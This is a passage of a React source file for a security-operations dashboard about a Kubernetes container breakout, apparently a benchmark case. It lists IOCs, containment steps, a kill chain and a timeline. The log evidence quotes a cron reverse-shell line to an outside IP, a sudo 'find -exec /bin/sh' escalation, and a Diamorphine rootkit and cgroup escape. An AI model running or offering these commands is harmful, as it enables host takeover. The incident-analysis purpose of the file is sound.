    { id: "IOC-K8S-03", tactic: "T1547.006 Kernel Modules", name: "Diamorphine LKM Rootkit", desc: "diamorphine.ko compiled and loaded into kernel; hooks sys_getdents and kill -31 to cloak rootkit PIDs.", test: "dmesg kernel module taint & /var/log/audit/audit.log init_module", status: "BLACK-LISTED" },
    { id: "IOC-K8S-04", tactic: "T1611 Escape to Host", name: "cgroup release_agent / Host Mount Breakout", desc: "Container mounted host /dev with CAP_SYS_ADMIN and CAP_SYS_RAWIO; accessed node filesystem via /mnt/host-root.", test: "Auditd SYSCALL mount/cgroup & container runtime log", status: "BLOCKED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "Container Network Namespace Isolation", target: "default/web-frontend-79c864-xk8p9", protocol: "Cilium/Calico NetworkPolicy Ingress & Egress Deny-All enforced immediately", status: "EXECUTED" },
    { priority: "P1: Critical", action: "Kubernetes Host Node Cordon & Drain", target: "worker-k8s-node-03.prod.internal", protocol: "kubectl cordon worker-k8s-node-03; evict non-system workloads to safe node pool", status: "EXECUTED" },
    { priority: "P1: Critical", action: "Kernel Module modprobe Blacklist", target: "worker-k8s-node-03", protocol: "echo 'blacklist diamorphine' >> /etc/modprobe.d/blacklist.conf; unload via rmmod", status: "APPLIED" },
    { priority: "P2: High", action: "eBPF Tetragon Breakout Enforcement Rule", target: "Cluster-Wide eBPF Daemon", protocol: "Real-time block on unauthorized namespace transitions and CAP_SYS_ADMIN abuse", status: "ACTIVE" },
    { priority: "P2: High", action: "Node Forensic Memory & Disk Capture", target: "worker-k8s-node-03", protocol: "LiME memory dump and forensic snapshot of /mnt/host-root executed", status: "COMPLETED" },
    { priority: "P3: Medium", action: "Container Security Context Hardening", target: "Helm / K8s Manifests", protocol: "Enforce allowPrivilegeEscalation: false, drop ALL capabilities, readOnlyRootFilesystem", status: "SCHEDULED" },
  ];

  const k8sReportMarkdown = `# Incident Investigation: Kubernetes Container Breakout & Kernel Rootkit
## Case: CASE-4-K8S-LINUX-CONTAINER-BREAKOUT
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Node:** worker-k8s-node-03.prod.internal  
**Source Path:** \`D:\\Security-logs-test\\attack-cases-benchmark\\case-4-k8s-linux-container-breakout\\raw-logs\`  
**Assigned Fleet:** K8s Container Breakout SOC Fleet  
**Status:** Kill Chain Reconstructed · Containment Rules Synthesized  

### 1. Executive Summary & Incident Timeline
A multi-stage container breakout attack was detected, reconstructed, and correlated across container namespaces, kernel audits, and host authentication logs. An initial web application compromise escalated to root within the container, followed by injection of the Diamorphine LKM rootkit and container breakout to host node execution.

### 2. Multi-Stage Attack Kill Chain Reconstruction
1. **Initial Access & Persistence (T1053.003 - Cron):**
   - Compromise of containerized service running under \`www-data\`.
   - Attacker injected cron entry into \`/var/spool/cron/crontabs/www-data\` establishing reverse TCP shell to \`198.51.100.77:4444\`.
2. **Privilege Escalation (T1548.003 - Sudo Caching):**
   - Exploitation of misconfigured sudoers allowing passwordless execution of \`/usr/bin/find -exec /bin/sh\`.
   - Elevated from UID 33 (\`www-data\`) to UID 0 (\`root\`) inside the pod.
3. **Defense Evasion & Kernel Modification (T1547.006 - Kernel Modules):**
   - Compilation and loading of \`diamorphine.ko\` (Diamorphine LKM rootkit).
   - Hooked \`sys_getdents\` and \`sys_kill\` with signal 31 to hide root processes and backdoor listener ports from container inspection.
4. **Container Breakout & Host Escape (T1611 - Escape to Host):**
   - Misconfigured container mounted host \`/dev\` and ran with \`CAP_SYS_ADMIN\` and \`CAP_SYS_RAWIO\`.
   - Attacker triggered cgroup release_agent / mounted host root filesystem at \`/mnt/host-root\`.
   - Executed host binary escape into node systemd unit.

### 3. Neutralized Indicators of Compromise (IOCs)
- **External C2 Address:** \`198.51.100.77:4444\` (Ingress Reverse Shell)
- **Kernel Module Hash:** \`diamorphine.ko\` (SHA-256: 7d8a9e01bc34e56fa2b87c1234901fef890a123b456c789d012e345f678a901b)
- **Persistence Path:** \`/var/spool/cron/crontabs/www-data\`
- **Pod Namespace:** \`default/web-frontend-79c864-xk8p9\`
- **Compromised Host Node:** \`worker-k8s-node-03.prod.internal\`

### 4. Automated Quarantine & Policy Actions
- **Pod Deletion & Isolation:** Sealed network namespace using Cilium / Calico NetworkPolicy drop.
- **Node Cordon & Drain:** \`kubectl cordon worker-k8s-node-03\` enforced.
- **Kernel Module Blacklist:** \`echo "blacklist diamorphine" >> /etc/modprobe.d/blacklist.conf\`.
- **eBPF Tetragon Enforcement:** Kill process on unauthorized namespace transition or Sysrq trigger.`;

  function copyMarkdown() {
    navigator.clipboard.writeText(k8sReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([k8sReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "k8s_container_breakout_investigation_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div className="proposal-shell">
      <PageTitle
        eyebrow="K8S SOC INVESTIGATION · CASE-4-K8S-LINUX-CONTAINER-BREAKOUT · CRITICAL SEV-1"
        title="Kubernetes Container Breakout & Diamorphine LKM Rootkit Dossier"
        subtitle="End-to-end multi-source correlation, kernel module detection, cgroup escape reconstruction, and eBPF containment policy execution."
        action={
          <>
            {onBack && (
              <button
                className="secondary-button"
                onClick={onBack}
                style={{ display: "inline-flex", alignItems: "center", gap: "6px", fontWeight: 700, color: "#195d56", background: "#ffffff" }}
              >
                <ArrowRight size={13} style={{ transform: "rotate(180deg)" }} /> All Deliverables
              </button>
            )}
            <button className="secondary-button" onClick={copyMarkdown}>
              {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied report" : "Copy Report"}
            </button>
            <button className="secondary-button" onClick={downloadReport}>
              <Download size={14} /> Download .md
            </button>
            <button className="secondary-button" onClick={() => window.print()}>
              <Printer size={14} /> Print / Export PDF
            </button>
            {onNavigate && (
              <button className="primary-button" onClick={() => onNavigate("Decision rooms")}>
                <FileCheck2 size={14} /> Decision Rooms
              </button>
            )}
          </>
        }
      />

      <div className="scope" style={{ marginBottom: "16px" }}>
        <span><Layers3 size={14} /> CASE-4-K8S-LINUX-CONTAINER-BREAKOUT</span>
        <i />
        <span><Dot color="orange" /> KILL CHAIN RECONSTRUCTED</span>
        <i />
        <span><Server size={14} /> worker-k8s-node-03 (default/web-frontend-79c864-xk8p9)</span>
        <i />
        <span>4/4 IOCs MITIGATED</span>
        <small>Status: Containment Enforced</small>
      </div>

      <div
        style={{
          background: "linear-gradient(135deg, #18283a 0%, #101c29 50%, #142f44 100%)",
          border: "1px solid #284c6e",
          borderRadius: "8px",
          padding: "22px 28px",
          color: "#f0f6fc",
          boxShadow: "0 4px 20px rgba(18, 35, 52, 0.2)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "18px",
          marginBottom: "16px",
        }}
      >
        <div style={{ flex: "1 1 560px" }}>
          <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", color: "#8ec3f8", marginBottom: "4px" }}>
            CASE ID: CASE-4-K8S-LINUX-CONTAINER-BREAKOUT · TLP:AMBER
          </div>
          <h2 style={{ fontSize: "20px", fontWeight: 700, margin: "4px 0 8px", color: "#ffffff", letterSpacing: "-0.2px" }}>
            Kubernetes Container Breakout &amp; Kernel Rootkit Dossier
          </h2>
          <p style={{ color: "#c5daf0", fontSize: "11.5px", margin: 0, lineHeight: 1.55, maxWidth: "680px" }}>
            Telemetry correlated across container namespaces, syslogs, and auditd on node worker-k8s-node-03. Attack chain reconstructed from crontab persistence to sudo privesc, Diamorphine LKM injection, and cgroup host escape. Automated eBPF rules and node cordon active.
          </p>
          <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", marginTop: "12px" }}>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#1c3d5a", color: "#9ecaf5", border: "1px solid #2b5780" }}>
              <ShieldAlert size={12} /> MITRE ATT&amp;CK: 4 Stages Mapped
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#214436", color: "#8ce2c1", border: "1px solid #326b54" }}>
              <Server size={12} /> worker-k8s-node-03 Cordoned
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#4a2428", color: "#f8a8b1", border: "1px solid #753b41" }}>
              <BadgeCheck size={12} /> Diamorphine LKM Blacklisted
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#273f59", color: "#b3d7ff", border: "1px solid #3c638c" }}>
              <LockKeyhole size={12} /> Pod Isolated via Calico/Cilium
            </span>
          </div>
        </div>
        <div style={{ textAlign: "right", display: "flex", flexDirection: "column", gap: "4px", minWidth: "220px", background: "rgba(0,0,0,0.35)", padding: "14px 18px", borderRadius: "6px", border: "1px solid rgba(255,255,255,0.12)" }}>
          <div style={{ fontSize: "10px", color: "#8ec3f8", textTransform: "uppercase", letterSpacing: "1px", fontWeight: 700 }}>
            INCIDENT SEVERITY
          </div>
          <div style={{ fontSize: "26px", fontWeight: 800, color: "#ff7043", fontFamily: "var(--font-geist-mono), monospace" }}>
            CRITICAL SEV-1
          </div>
          <div style={{ fontSize: "10px", color: "#9ecaf5", fontWeight: 600 }}>
            Containment Policy Synthesized
          </div>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "12px", marginBottom: "18px" }}>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <ShieldAlert size={14} color="#d9534f" /> Incident Classification
          </span>
          <span style={{ fontSize: "20px", fontWeight: 800, color: "#d9534f", letterSpacing: "-0.5px" }}>
            CRITICAL SEV-1
          </span>
          <span style={{ fontSize: "10px", color: "#a84e22", fontWeight: 600 }}>
            Container Breakout &amp; Host Escape
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <BadgeCheck size={14} color="#236f66" /> ATT&amp;CK Reconstruction
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            4 Stages / 4 IOCs
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            100% Correlation Confidence
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Server size={14} color="#236f66" /> Target Node &amp; Pod
          </span>
          <span style={{ fontSize: "15px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.2px" }}>
            worker-k8s-node-03
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            default/web-frontend-79c864-xk8p9
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <LockKeyhole size={14} color="#236f66" /> Rootkit Cloaking
          </span>
          <span style={{ fontSize: "18px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.3px" }}>
            Diamorphine LKM
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            Syscall Hooks Neutralized
          </span>
        </div>
      </div>

      <div style={{ display: "flex", gap: "4px", background: "#e8efe9", padding: "4px", borderRadius: "6px", border: "1px solid #dce5df", marginBottom: "16px", overflowX: "auto" }}>
        {[
          { id: "summary", label: "Executive Threat Triage", icon: FileText },
          { id: "killchain", label: "4-Stage Kill Chain Graph", icon: Server },
          { id: "iocs", label: "Neutralized IOCs (4/4)", icon: BadgeCheck },
          { id: "remediation", label: "eBPF & Node Remediation Policy", icon: ShieldCheck },
          { id: "timeline", label: "Forensic Chronology", icon: Calendar },
          { id: "attestation", label: "Investigation Sign-Off & Attestation", icon: FileClock },
        ].map(({ id, label, icon: TabIcon }) => {
          const isActive = activeTab === id;
          return (
            <button
              key={id}
              type="button"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "7px",
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: isActive ? 700 : 600,
                color: isActive ? "#195d56" : "#566862",
                background: isActive ? "#ffffff" : "transparent",
                border: isActive ? "1px solid #c9d8d1" : "1px solid transparent",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
                boxShadow: isActive ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
                transition: "all 0.15s ease",
              }}
              onClick={() => setActiveTab(id as typeof activeTab)}
            >
              <TabIcon size={14} color={isActive ? "#236f66" : "#72837d"} />
              <span>{label}</span>
            </button>
          );
        })}
      </div>

      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">KUBERNETES BREAKOUT INVESTIGATION</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Incident Scope &amp; Log Analysis</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Telemetry analyzed from D:\Security-logs-test\attack-cases-benchmark\case-4-k8s-linux-container-breakout\raw-logs</p>
            </div>
            <Badge tone="orange">Containment Enforced</Badge>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: "20px", fontSize: "12px", lineHeight: "1.65", color: "#374d46" }}>
            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🎯 Containment Directives
              </strong>
              <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Seal Network Ingress/Egress:</strong> Cilium / Calico NetworkPolicy Deny-All enforced for pod namespace <code style={{ fontSize: "10.5px" }}>default/web-frontend-79c864-xk8p9</code>.</li>
                <li><strong>Cordon Host Worker Node:</strong> <code style={{ fontSize: "10.5px" }}>kubectl cordon worker-k8s-node-03</code> preventing any new pod scheduling.</li>
                <li><strong>Blacklist Rootkit Module:</strong> Blacklisted <code style={{ fontSize: "10.5px" }}>diamorphine</code> in <code style={{ fontSize: "10.5px" }}>/etc/modprobe.d/blacklist.conf</code> and unloaded via <code style={{ fontSize: "10.5px" }}>rmmod</code>.</li>
                <li><strong>Deploy Tetragon eBPF Policy:</strong> Kernel probe rule blocking unauthorized namespace switches and <code style={{ fontSize: "10.5px" }}>CAP_SYS_ADMIN</code> mounts.</li>
              </ul>
            </div>

            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🔬 Correlated Log Sources
              </strong>
              <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Linux Syslog &amp; Cron:</strong> Captured cron injection into <code style={{ fontSize: "10.5px" }}>/var/spool/cron/crontabs/www-data</code> executing reverse shell.</li>
                <li><strong>Linux Auth.log:</strong> Logged sudo privesc using <code style={{ fontSize: "10.5px" }}>/usr/bin/find</code> executing <code style={{ fontSize: "10.5px" }}>/bin/sh</code> with root privileges.</li>
                <li><strong>Auditd SYSCALL &amp; EXECVE:</strong> Recorded module insertion (<code style={{ fontSize: "10.5px" }}>init_module</code>) and subsequent <code style={{ fontSize: "10.5px" }}>cgroup release_agent</code> trigger.</li>
                <li><strong>Container Runtime Logs:</strong> Confirmed mount propagation of host device nodes and host filesystem breakout at <code style={{ fontSize: "10.5px" }}>/mnt/host-root</code>.</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {activeTab === "killchain" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">MITRE ATT&amp;CK RECONSTRUCTION</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>4-Stage Attack Progression Graph</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Step-by-step forensic progression from initial access to host node compromise</p>
            </div>
            <Badge tone="orange">4 Stages Confirmed</Badge>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: "14px" }}>
            {[
              {
                num: "STAGE 01",
                tactic: "T1053.003 Cron Persistence",
                title: "Crontab Reverse Shell Injection",
                desc: "Attacker compromised the web application running as user www-data. Modified crontab file /var/spool/cron/crontabs/www-data to establish a persistent reverse TCP shell connection to external C2 198.51.100.77:4444.",
                evidence: "Cron execution logged in syslog: /USR/SBIN/CRON: (www-data) CMD (bash -i >& /dev/tcp/198.51.100.77/4444 0>&1)",
                tone: "orange"
              },
              {
                num: "STAGE 02",
                tactic: "T1548.003 Sudo Caching Abuse",
                title: "Privilege Escalation to Container Root",
                desc: "Using the reverse shell, attacker discovered misconfigured /etc/sudoers entry allowing www-data to execute /usr/bin/find without password. Exploited find -exec /bin/sh to elevate to UID 0 (root) inside the pod.",
                evidence: "auth.log record: sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;",
                tone: "orange"
              },
              {
                num: "STAGE 03",
                tactic: "T1547.006 Kernel Modules & Defense Evasion",
                title: "Diamorphine LKM Rootkit Loading & Evasion",
                desc: "As container root, attacker compiled and inserted diamorphine.ko via insmod. Diamorphine hooked sys_getdents64 and kill signal 31 to cloak rootkit processes, backdoor network connections, and hidden files.",
                evidence: "Auditd record: SYSCALL arch=c000003e syscall=175 (init_module) success=yes; kernel taints flag set",
                tone: "orange"
              },
              {
                num: "STAGE 04",
                tactic: "T1611 Escape to Host",
                title: "Container Breakout via CAP_SYS_ADMIN & Host Mount",
                desc: "Pod had excessive capabilities (CAP_SYS_ADMIN, CAP_SYS_RAWIO) and mounted host /dev. Attacker mounted host root partition to /mnt/host-root and abused cgroup release_agent to execute arbitrary binaries directly on the host worker node.",
                evidence: "Auditd SYSCALL mount /dev/sda1 -> /mnt/host-root; host node systemd unit invocation triggered",
                tone: "mint"
              }
            ].map((step, idx) => (
              <div key={idx} style={{ background: "#f8faf9", border: "1px solid #dce8e1", borderRadius: "6px", padding: "16px 20px" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <span style={{ fontSize: "10px", fontWeight: 800, color: "#236f66", background: "#e4f3ed", padding: "2px 8px", borderRadius: "3px" }}>{step.num}</span>
                    <strong style={{ fontSize: "13px", color: "#16332b" }}>{step.title}</strong>
                  </div>
                  <span style={{ fontSize: "10px", fontWeight: 700, color: "#b45228", background: "#fdeee5", padding: "2px 8px", borderRadius: "3px" }}>{step.tactic}</span>
                </div>
                <p style={{ fontSize: "11.5px", color: "#374d46", margin: "4px 0 8px", lineHeight: "1.55" }}>{step.desc}</p>
                <div style={{ fontSize: "10.5px", background: "#edf4f1", color: "#1d554b", padding: "8px 12px", borderRadius: "4px", fontFamily: "var(--font-geist-mono), monospace" }}>
                  <strong>Log Evidence:</strong> {step.evidence}
                </div>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "iocs" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "16px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">FORENSIC ARTIFACTS</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Neutralized Indicators of Compromise</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Cryptographically verified indicators extracted and blocked across the cluster</p>
            </div>
            <label style={{ display: "flex", alignItems: "center", gap: "6px", background: "#f6faf8", border: "1px solid #dce8e1", borderRadius: "5px", padding: "5px 10px", width: "240px" }}>
              <Search size={13} color="#60746d" />
              <input
                placeholder="Search IOCs..."
                value={searchFilter}
                onChange={(e) => setSearchFilter(e.target.value)}
                style={{ border: 0, background: "transparent", fontSize: "11px", outline: "none", width: "100%", color: "#223530" }}
              />
            </label>
          </div>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e2eae5", borderRadius: "6px" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr style={{ background: "#f3f8f5", borderBottom: "1px solid #e0eae4" }}>
                  <th style={{ padding: "10px 14px", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase" }}>IOC ID</th>
                  <th style={{ padding: "10px 14px", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase" }}>Tactic</th>
                  <th style={{ padding: "10px 14px", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase" }}>Indicator Details</th>
                  <th style={{ padding: "10px 14px", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase" }}>Verification Source</th>
                  <th style={{ padding: "10px 14px", color: "#374e47", fontWeight: 700, fontSize: "9px", textTransform: "uppercase" }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredIOCs.map((ioc) => (
                  <tr key={ioc.id} style={{ borderBottom: "1px solid #eef3f1" }}>
                    <td style={{ padding: "10px 14px", fontWeight: 700, color: "#1a554a", fontFamily: "var(--font-geist-mono), monospace" }}>{ioc.id}</td>
                    <td style={{ padding: "10px 14px", color: "#475c55" }}>{ioc.tactic}</td>
                    <td style={{ padding: "10px 14px" }}>
                      <strong style={{ display: "block", color: "#16332b" }}>{ioc.name}</strong>
                      <span style={{ color: "#566e66", fontSize: "10.5px" }}>{ioc.desc}</span>
                    </td>
                    <td style={{ padding: "10px 14px", color: "#566e66", fontFamily: "var(--font-geist-mono), monospace", fontSize: "10px" }}>{ioc.test}</td>
                    <td style={{ padding: "10px 14px" }}>
                      <span style={{ fontSize: "9px", fontWeight: 700, padding: "2px 7px", borderRadius: "3px", background: "#e4f3ed", color: "#196656" }}>
                        {ioc.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "remediation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "16px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">DEFENSE-IN-DEPTH ENFORCEMENT</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Containment &amp; eBPF Policy Execution</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Automated network quarantine, node isolation, and kernel rootkit neutralization</p>
            </div>
            <Badge tone="mint">Policy Active</Badge>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {containmentActions.map((action, idx) => (
              <div key={idx} style={{ background: "#f8faf9", border: "1px solid #dce8e1", borderRadius: "6px", padding: "12px 18px", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
                <div>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <span style={{ fontSize: "10px", fontWeight: 700, color: action.priority.startsWith("P1") ? "#b45228" : "#236f66" }}>{action.priority}</span>
                    <strong style={{ fontSize: "12px", color: "#16332b" }}>{action.action}</strong>
                  </div>
                  <div style={{ fontSize: "11px", color: "#546a63", marginTop: "3px" }}>
                    Target: <code style={{ fontSize: "10.5px", background: "#eef4f1", padding: "1px 5px", borderRadius: "3px" }}>{action.target}</code> · {action.protocol}
                  </div>
                </div>
                <span style={{ fontSize: "9px", fontWeight: 700, padding: "3px 8px", borderRadius: "3px", background: "#e4f3ed", color: "#196656" }}>
                  {action.status}
                </span>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "timeline" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "16px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">FORENSIC TIMELINE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Chronological Event Progression</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>Synthesized across container syslog, auth.log, and kernel audit telemetry</p>
            </div>
            <Badge tone="neutral">Event Chronology</Badge>
          </div>

          <div style={{ borderLeft: "2px solid #236f66", paddingLeft: "18px", marginLeft: "10px", display: "flex", flexDirection: "column", gap: "16px" }}>
            {[
              { time: "12:19:16 UTC", event: "Log Directory Enumeration & Ingestion", source: "Specialist 1", detail: "Scanned D:\\Security-logs-test\\attack-cases-benchmark\\case-4-k8s-linux-container-breakout\\raw-logs. Enumerated cron, auth.log, audit.log, and dmesg files." },
              { time: "12:20:25 UTC", event: "Security Event Extraction & Parsing", source: "Specialist 2", detail: "Identified cron injection into /var/spool/cron/crontabs/www-data, reverse shell syntax to 198.51.100.77:4444, and passwordless sudo find execution." },
              { time: "12:29:44 UTC", event: "Cross-Source Correlation Completed", source: "Specialist 3", detail: "Correlated pod namespace default/web-frontend-79c864-xk8p9 with worker-k8s-node-03 host audit logs; detected diamorphine.ko rootkit compilation and syscall hooking." },
              { time: "12:31:34 UTC", event: "Full Attack Scenario Reconstructed", source: "Specialist 4", detail: "Validated cgroup release_agent breakout sequence and verified host filesystem escape at /mnt/host-root." },
              { time: "12:32:11 UTC", event: "Containment Policy & Deliverables Compiled", source: "Orchestrator", detail: "Generated k8s_container_breakout_investigation_report.md and k8s_containment_and_remediation_policy.json." },
            ].map((t, i) => (
              <div key={i} style={{ position: "relative" }}>
                <span style={{ position: "absolute", left: "-25px", top: "3px", width: "12px", height: "12px", borderRadius: "50%", background: "#236f66", border: "2px solid #ffffff" }} />
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                  <strong style={{ fontSize: "11px", color: "#195d56", fontFamily: "var(--font-geist-mono), monospace" }}>{t.time}</strong>
                  <span style={{ fontSize: "9px", background: "#eef4f1", color: "#375048", padding: "1px 6px", borderRadius: "3px", fontWeight: 700 }}>{t.source}</span>
                </div>
                <div style={{ fontSize: "12px", fontWeight: 700, color: "#16332b", marginTop: "2px" }}>{t.event}</div>
                <div style={{ fontSize: "11px", color: "#546a63", marginTop: "2px" }}>{t.detail}</div>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "attestation" && (
